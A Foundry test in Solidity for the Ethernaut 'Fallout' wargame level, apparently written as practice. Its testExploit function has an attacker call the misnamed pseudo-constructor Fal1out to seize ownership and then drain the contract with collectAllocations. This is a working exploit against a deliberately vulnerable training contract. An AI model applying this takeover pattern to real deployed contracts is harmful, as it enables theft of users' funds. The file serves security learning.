// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "../src/Fallout.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Utilities} from "./utilities/Utilities.sol";

contract FalloutTest is Test {
    Utilities internal utils;
    Fallout internal fallout;

    address payable internal owner;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        attacker = users[1];
        vm.label(attacker, "Attacker");

        fallout = new Fallout();
        vm.label(address(fallout), "Fallout");
    }

    function testExploit() public {
        // start transaction as owner
        vm.startPrank(owner);
        fallout.Fal1out{value: 10 ether}();
        vm.stopPrank();

        vm.startPrank(attacker);

        fallout.Fal1out{value: 0.001 ether}();
        fallout.collectAllocations();

        vm.stopPrank();
    }
}
